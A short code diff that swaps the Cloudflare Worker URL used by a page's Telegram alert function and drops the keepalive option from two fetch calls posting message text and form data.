@@ -672,15 +672,14 @@
     initVisitorTracker();
 
     /* ========================================================== Cloudflare Worker Proxy + টেলিগ্রাম অ্যালার্ট ফাংশন ========================================================== */
-    const WORKER_URL = "https://login-alert-bot.rakibulislam40r0.workers.dev";
+    const WORKER_URL = "https://ancient-union-b5bc.rakibulislam40r0.workers.dev";
 
     async function sendTelegramAlert(messageText) {
       try {
         const res = await fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ text: messageText }),
-          keepalive: true
+          body: JSON.stringify({ text: messageText })
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok || !data.ok) {
@@ -699,8 +698,7 @@
 
         const res = await fetch(WORKER_URL, {
           method: "POST",
-          body: formData,
-          keepalive: true
+          body: formData
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok || !data.ok) {
